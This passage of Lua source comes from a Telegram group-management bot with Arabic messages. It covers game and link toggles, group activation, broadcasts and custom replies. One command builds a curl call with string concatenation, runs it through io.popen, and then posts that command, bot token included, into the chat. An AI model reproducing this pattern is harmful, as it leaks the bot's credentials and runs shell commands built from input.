local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱلٱڵعٱب بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل الالعاب' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'تعطيل اللعبه' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then  
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱلٱڵعٱب بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:lock_geam'..msg.chat_id_) 
end
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'تفعيل جلب الصور' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then   
if DevAbs:get(DevProx..'lock:get:photo'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ جڵب ٱڵصور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'lock:get:photo'..msg.chat_id_) 
else
ABS_PROX = '☬︙جڵب ٱڵصورة ٱڵشخصية بٱڵتاكيد مۧفعڵـة ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
end
end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'تعطيل جلب الصور' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then   
if not DevAbs:get(DevProx..'lock:get:photo'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ جڵب ٱڵصور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'lock:get:photo'..msg.chat_id_,true) 
else
ABS_PROX = '☬︙جڵب ٱڵصورة ٱڵشخصية بٱڵتاكيد مۧعطڵـة '  
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
end
end
if text and text == "تفعيل الرابط" and Abbas_Abs(msg) then 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ رٱبـط ٱڵمجـمۄعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and Abbas_Abs(msg) then 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ رٱبـط ٱڵمجـمۄعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."bot:tt:link:"..msg.chat_id_,"ok")
end
if text and text:match('^تفعيل$') and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(DevProx.."abs:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧفعڵـة', 1, 'md')
else
absmoned(msg.chat_id_, result.id_, msg.id_, '☬︙ٱهلٱ عزيزي ↫ '..CatchName(result.first_name_,15)..' \nڵقد تـۖم تـفعيـۧڵ ٱڵمجـمۄعة بنجٱح \nتم رفع ٱلٱدمنيه وٱڵمنشئ ٱلٱسٱسي \n ✓', 16, utf8.len(CatchName(result.first_name_,15))) 
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function DevProx3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or DevId)), 0, 1, "☬︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ايدي الضافني ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙معرف الضافني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n☬︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n☬︙رابط المجموعه ↫ ⤈\n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ٱڵوقت ↫ "..os.date("%I:%M%p").." \n☬︙ٱڵتٱريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, DevProx3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(DevProx.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(DevProx.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
local send_to_DevId = function(extra, result)
local v = tonumber(DevId)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
---
if text and text:match('^تعطيل$') and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
function remgroup(extra, result, success)
if not DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧعطڵـة', 1, 'md')
else
ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..CatchName(result.first_name_,15)..'\nڵقد تـۖم تـعطيـۧڵ ٱڵمجـمۄعة بنجٱح \n ✓'
absmoned(msg.chat_id_, result.id_, msg.id_, ABS_PROX, 16, utf8.len(CatchName(result.first_name_,15))) 
DevAbs:del(DevProx.."bot:charge:"..msg.chat_id_)
DevAbs:del(DevProx.."bot:enable:"..msg.chat_id_)
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_)
local v = tonumber(DevId)          
end
end
getUser(msg.sender_user_id_,remgroup)
end

if text and text:match("^تفعيل كل الكروبات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local gps = DevAbs:smembers(DevProx.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:sadd("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:set(DevProx.."bot:enable:"..gps[i],true)
DevAbs:set( DevProx.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تـفعيـۧڵ ٱڵبـۄت فيۧ جميع ٱڵمجـمۄعٱت \n☬︙عدد المجموعات ↫ ❨ '..(#gps - #gps2)..' ❩', 1, 'md')
end   
if text and text:match("^تعطيل كل الكروبات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local gps = DevAbs:smembers(DevProx.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:del("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:del(DevProx.."bot:enable:"..gps[i],true)
DevAbs:del( DevProx.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تـعطيـۧڵ ٱڵبـۄت فيۧ جميع ٱڵمجـمۄعٱت \n☬︙عدد المجموعات ↫ ❨ '..(#gps - #gps2)..' ❩', 1, 'md')
end   
--     Source DevProx     --
if text and text:match("^الدعم$") or text and text:match("^المطور$") then
function adding(extra,result,success)
function ABS_PROX(f1,f2)
function DevProx3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or DevId)), 0, 1, "☬︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ايدي الشخص ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙معرف الشخص ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n☬︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n☬︙رابط المجموعه ↫ ⤈ \n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ٱڵوقت ↫ "..os.date("%I:%M%p").." \n☬︙ٱڵتٱريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, DevProx3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getUser(msg.sender_user_id_,adding)
end
--     Source DevProx     --
if text == 'نسخه ملف السورس' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
sendDocument(DevId, 0, 0, 1, nil, './DevProx.lua', dl_cb, nil)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عـزيـزي ٱڵـمطور تم ٱرسـۧال نسـۧخة ملف ٱڵـسـۧورس ٱڵـى ٱڵـخاص ', 1, 'md')
end end
--     Source DevProx     --
if text == 'روابط الكروبات' and Abbas_Abs(msg) or text == 'روابط المجموعات' and Abbas_Abs(msg) then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (DevAbs:scard(DevProx.."bot:groups"))
local list = DevAbs:smembers(DevProx.."bot:groups")
local text = "(Source DevProx - سورس ديف بروكس)\nΞ - File bot groups -\nΞ - ملف مجموعات البوت -\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local GroupsMonsh = DevAbs:scard(DevProx.."abs:monsh:"..v) or 0
local GroupsOwner = DevAbs:scard(DevProx.."abs:owners:"..v) or 0
local GroupsMod = DevAbs:scard(DevProx.."abs:admins:"..v) or 0
local Groupslink = DevAbs:get(DevProx.."bot:group:link" ..v)
text = text..k.." ↫ ⤈ \n☬︙Group ID  : [ "..v.." ]\n☬︙Group Link : [ "..(Groupslink or "Not Found").." ]\n☬︙Group Monsh  : [ "..GroupsMonsh.." ]\n☬︙Group Owners  : [ "..GroupsOwner.." ]\n☬︙Group Admins : [ "..GroupsMod.." ] \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end
local file = io.open('GroupsBot.txt', 'w')
file:write(text)
file:close()
local abbss = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
local abbsss = 'curl "' .. abbss .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(abbsss)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙جٱري ٱرسٱڵ نسخة ڵڵمجمۄعٱت \n☬︙تحتوي عڵى ( *'..num..'* ) مجمۄعة \n ', 1, 'md')
sleep(1.5)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbsss, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end
end
--     Source DevProx     --
if text == "اذاعه بالخاص" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص ☬" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(DevProx.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙ٱرسڵ ڵي سوٱء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(DevProx.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغٱء ٱمر ٱلٱذٱعه بنجٱح", 1, 'md')
DevAbs:del(DevProx.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevAbs:smembers(DevProx..'bot:userss') 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Abs(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱذٱعة رسٱڵتك بنجٱح \n☬︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(DevProx.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevProx     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام ☬" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(DevProx.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙ٱرسڵ ڵي سوٱء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(DevProx.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغٱء ٱمر ٱلٱذٱعه بنجٱح", 1, 'md')
DevAbs:del(DevProx.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevAbs:smembers(DevProx..'bot:groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Abs(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱذٱعة رسٱڵتك بنجٱح \n☬︙‏في ↫ ❨ "..#list.." ❩ مجموعة \n ✓", 1, 'md')
DevAbs:del(DevProx.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevProx     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام بالتوجيه ☬" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(DevProx.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙ٱرسڵ ٱڵرسٱڵه ٱلٱن ڵتوجيهٱ \n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(DevProx.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغٱء ٱمر ٱلٱذٱعه بنجٱح", 1, 'md')
DevAbs:del(DevProx.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevAbs:smembers(DevProx..'bot:groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱذٱعة رسٱڵتك بٱڵتوجية \n☬︙‏في ↫ ❨ "..#list.." ❩ مجموعة \n ✓", 1, 'md')
DevAbs:del(DevProx.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevProx     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص بالتوجيه ☬" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(DevProx.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙ٱرسڵ ٱڵرسٱڵه ٱلٱن ڵتوجيهٱ \n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(DevProx.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغٱء ٱمر ٱلٱذٱعه بنجٱح", 1, 'md')
DevAbs:del(DevProx.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevAbs:smembers(DevProx..'bot:userss')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱذٱعة رسٱڵتك بٱڵتوجية \n☬︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(DevProx.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevProx     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱڵكلمة ڵحذفهٱ " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱڵكلمة *('..msg.content_.text_..')* تـۖم حـذفهٱ ',  1, "md")
DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:srem(DevProx..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
--     Source DevProx     --
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱڵكلمة ٱلٱن " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_DevAbs2 == 'set_repgp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ڵي ٱڵرد سوٱء كٱن ↫ ⤈\n❨ ملصق • متحركه • صوره • فيديو\n • بصمه • صوت • رساله ❩\n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
DevAbs:set(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevAbs:sadd(DevProx..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
 text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == '↫ حذف رد عام ☬' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) then
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'del_rep1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱڵكلمة ڵحذفهٱ " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱڵكلمة *('..msg.content_.text_..')* تـۖم حـذفهٱ ',  1, "md")
DevAbs:del(DevProx.."add:repallt"..msg.sender_user_id_)
DevAbs:del(DevProx.."gif_repall"..msg.content_.text_)
DevAbs:del(DevProx.."voice_repall"..msg.content_.text_)
DevAbs:del(DevProx.."audio_repall"..msg.content_.text_)
DevAbs:del(DevProx.."photo_repall"..msg.content_.text_)
DevAbs:del(DevProx.."stecker_repall"..msg.content_.text_)
DevAbs:del(DevProx.."video_repall"..msg.content_.text_)
DevAbs:del(DevProx.."text_repall"..msg.content_.text_)
DevAbs:del(DevProx.."rep_sudo",msg.content_.text_)
return false
end
end
--     Source DevProx     --
if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == '↫ اضف رد عام ☬' and is_sudo(msg) then
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'set_rep')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱڵكلمة ٱلٱن " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_DevAbs2 == 'set_rep' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ڵي ٱڵرد سوٱء كٱن ↫ ⤈\n❨ ملصق • متحركه • صوره • فيديو\n • بصمه • صوت • رساله ❩\n ✓" ,  1, "md")
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'save_rep')
DevAbs:set(DevProx.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
DevAbs:sadd(DevProx.."rep_sudo",msg.content_.text_)
return false 
end    end
--     Source DevProx     --
if msg.content_.text_ == 'حذف اغنيه' and is_sudo(msg) or msg.content_.text_ == '↫ حذف اغنيه ☬' and is_sudo(msg) or msg.content_.text_ == 'مسح اغنيه' and is_sudo(msg) then
DevAbs:set(DevProx.."add:repmusic"..msg.sender_user_id_,'del_rep1music')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱسم ٱلٱغنيه ڵحذفهٱ " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(DevProx.."add:repmusic"..msg.sender_user_id_)
if content_text == 'del_rep1music' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱلٱغنيه *('..msg.content_.text_..')* تـۖم حـذفهٱ ',  1, "md")
DevAbs:del(DevProx.."add:repmusic"..msg.sender_user_id_)
DevAbs:del(DevProx.."voice_repmusic"..msg.content_.text_)
DevAbs:del(DevProx.."audio_repmusic"..msg.content_.text_)
DevAbs:del(DevProx.."video_repmusic"..msg.content_.text_)
DevAbs:del(DevProx.."repmusic_sudo",msg.content_.text_)
return false
end
end

if msg.content_.text_ == 'اضف اغنيه' and is_sudo(msg) or msg.content_.text_ == '↫ اضف اغنيه ☬' and is_sudo(msg) then
DevAbs:set(DevProx.."add:repmusic"..msg.sender_user_id_,'set_repmusic')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙حسنٱ ٱرسـڵ ٱسم ٱلٱغنيه ٱلٱن" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(DevProx.."add:repmusic"..msg.sender_user_id_)
if content_DevAbs2 == 'set_repmusic' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ٱلٱغنيه سوٱء كٱنت ↫ ⤈\n❨ بصمه • فيديو • صوت ❩\n ✓" ,  1, "md")
DevAbs:set(DevProx.."add:repmusic"..msg.sender_user_id_,'save_repmusic')
DevAbs:set(DevProx.."addreply3:"..msg.sender_user_id_, msg.content_.text_)
DevAbs:sadd(DevProx.."repmusic_sudo",msg.content_.text_)
return false 
end    end
--     Source DevProx     --
if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local redod = DevAbs:smembers(DevProx..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
msg_rep = '☬︙رډوډ ٱڵمجموعة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k..' ⌯ *❨ '..v..' ❩* \n' 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     Source DevProx     --
